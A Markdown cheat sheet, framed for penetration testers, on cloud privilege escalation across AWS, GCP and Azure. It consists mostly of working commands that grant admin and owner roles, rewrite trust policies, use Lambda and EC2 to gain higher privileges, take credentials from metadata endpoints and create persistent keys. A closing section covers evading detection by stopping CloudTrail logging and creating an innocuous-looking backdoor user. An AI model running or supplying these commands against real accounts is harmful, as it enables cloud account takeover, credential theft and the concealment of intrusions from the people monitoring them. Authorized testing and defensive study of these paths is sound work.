# Cloud Privilege Escalation Guide

> Practical techniques for escalating privileges across AWS, GCP, and Azure cloud environments. Covers IAM policy abuse, service account exploitation, role manipulation, and cross-service escalation paths that penetration testers encounter in real engagements.

---

## 1. AWS IAM Privilege Escalation Enumeration

Before escalating, enumerate the current principal's permissions to identify exploitable paths.

```bash
# Get current identity
aws sts get-caller-identity

# Enumerate all policies attached to current user
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# List inline policies
aws iam list-user-policies --user-name $(aws sts get-caller-identity --query 'Arn' --output text | cut -d'/' -f2)

# Decode policy document to find dangerous permissions
aws iam get-user-policy --user-name TARGET_USER --policy-name POLICY_NAME \
  --query 'PolicyDocument' --output json | jq '.Statement[]'

# Use enumerate-iam for automated permission discovery
python3 enumerate-iam.py --access-key AKIA... --secret-key SECRET --region us-east-1
```

---

## 2. AWS IAM Policy Abuse Paths

Several IAM permissions allow direct privilege escalation when held by a compromised principal.

```bash
# Path 1: iam:CreatePolicyVersion — attach a new admin policy version
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/TARGET_POLICY \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# Path 2: iam:AttachUserPolicy — attach AdministratorAccess directly
aws iam attach-user-policy --user-name COMPROMISED_USER \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Path 3: iam:PutUserPolicy — inject inline admin policy
aws iam put-user-policy --user-name COMPROMISED_USER --policy-name escalate \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}'

# Path 4: iam:CreateLoginProfile — create console access for service user
aws iam create-login-profile --user-name SERVICE_USER --password 'P@ssw0rd!2024' --no-password-reset-required

# Path 5: iam:UpdateAssumeRolePolicy — modify trust policy to assume admin role
aws iam update-assume-role-policy --role-name ADMIN_ROLE \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":"arn:aws:iam::ACCOUNT:user/COMPROMISED_USER"},"Action":"sts:AssumeRole"}]}'
```

---

## 3. AWS Cross-Service Escalation

Lambda, EC2, and other services can be leveraged to escalate when direct IAM paths are blocked.

```bash
# Lambda escalation: create function with admin role
cat > /tmp/escalate.py << 'EOF'
import boto3
def handler(event, context):
    iam = boto3.client('iam')
    iam.attach_user_policy(
        UserName='COMPROMISED_USER',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    return {'status': 'escalated'}
EOF
zip /tmp/escalate.zip /tmp/escalate.py

aws lambda create-function --function-name escalate \
  --runtime python3.11 --handler escalate.handler \
  --role arn:aws:iam::ACCOUNT:role/OVERPRIVILEGED_ROLE \
  --zip-file fileb:///tmp/escalate.zip

aws lambda invoke --function-name escalate /tmp/output.json

# EC2 escalation: launch instance with instance profile
aws ec2 run-instances --image-id ami-0abcdef1234567890 \
  --instance-type t3.micro --iam-instance-profile Name=ADMIN_PROFILE \
  --user-data '#!/bin/bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ADMIN_ROLE > /tmp/creds.json'
```

---

## 4. GCP Service Account Abuse

GCP privilege escalation often targets service account impersonation and token generation.

```bash
# List all service accounts in the project
gcloud iam service-accounts list --project PROJECT_ID

# Check if current identity can impersonate a service account
gcloud iam service-accounts get-iam-policy SA_EMAIL \
  --format=json | jq '.bindings[] | select(.role | contains("iam.serviceAccountTokenCreator"))'

# Generate access token for a privileged service account
gcloud auth print-access-token --impersonate-service-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com

# Escalate via setIamPolicy on project (if iam.projects.setIamPolicy held)
gcloud projects add-iam-policy-binding PROJECT_ID \
  --member="user:attacker@gmail.com" --role="roles/owner"

# Create service account key for persistent access
gcloud iam service-accounts keys create /tmp/key.json \
  --iam-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com

# Exploit Cloud Functions with overprivileged SA
gcloud functions deploy escalate --runtime python311 \
  --trigger-http --allow-unauthenticated \
  --service-account=ADMIN_SA@PROJECT.iam.gserviceaccount.com \
  --source=/tmp/escalate_function/
```

---

## 5. Azure Role Manipulation

Azure escalation targets role assignments, managed identities, and Entra ID (Azure AD) permissions.

```bash
# List current role assignments
az role assignment list --assignee $(az ad signed-in-user show --query id -o tsv) --all

# Check for User Access Administrator role (can assign any role)
az role assignment list --all --query "[?roleDefinitionName=='User Access Administrator']"

# Escalate: assign Owner role to compromised principal
az role assignment create --assignee ATTACKER_OBJECT_ID \
  --role "Owner" --scope "/subscriptions/SUB_ID"

# Abuse managed identity from compromised VM
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq '.access_token'

# Use stolen token to enumerate subscriptions
az account list --output table  # after setting token via az login

# Escalate via custom role definition (if Microsoft.Authorization/roleDefinitions/write)
az role definition create --role-definition '{
  "Name": "CustomAdmin",
  "Actions": ["*"],
  "NotActions": [],
  "AssignableScopes": ["/subscriptions/SUB_ID"]
}'
```

---

## 6. Automated Escalation Tools

Purpose-built tools accelerate discovery of privilege escalation paths.

```bash
# PACU — AWS exploitation framework
# Install and run privilege escalation modules
python3 pacu.py
# Inside PACU:
# > import_keys AKIA... SECRET
# > run iam__privesc_scan
# > run iam__escalate_privileges

# ScoutSuite — multi-cloud security auditing
scout aws --profile compromised_profile
scout gcp --service-account /tmp/key.json
scout azure --cli

# Cloudfox — AWS enumeration for pentesters
cloudfox aws --profile target permissions
cloudfox aws --profile target role-trusts
cloudfox aws --profile target iam-simulator --principal arn:aws:iam::ACCOUNT:user/COMPROMISED

# GCPBucketBrute + privilege checks
python3 gcpbucketbrute.py -k key.json -p PROJECT_ID
```

---

## 7. Detection Evasion and Cleanup

Minimize detection footprint during cloud privilege escalation engagements.

```bash
# AWS: Use regions with less monitoring coverage
aws iam create-user --user-name backup-svc --region ap-southeast-1

# AWS: Disable CloudTrail if permissions allow (noisy — use only if authorized)
aws cloudtrail stop-logging --name default-trail

# GCP: Check audit log configuration before acting
gcloud projects get-iam-policy PROJECT_ID --format=json | jq '.auditConfigs'

# Azure: Check diagnostic settings
az monitor diagnostic-settings list --resource /subscriptions/SUB_ID

# General: Use short-lived credentials and clean up
aws iam delete-access-key --user-name TEMP_USER --access-key-id AKIA...
gcloud iam service-accounts keys delete KEY_ID --iam-account=SA_EMAIL
```

---

## Key Takeaways

- Always enumerate before escalating — understand what permissions the compromised principal holds
- AWS has 20+ documented IAM escalation paths; prioritize `iam:CreatePolicyVersion`, `iam:AttachUserPolicy`, and `sts:AssumeRole`
- GCP escalation centers on service account impersonation and `setIamPolicy` permissions
- Azure escalation targets User Access Administrator and managed identity token theft
- Use automated tools (PACU, Cloudfox, ScoutSuite) to accelerate path discovery
- Document all actions for the engagement report and clean up temporary resources
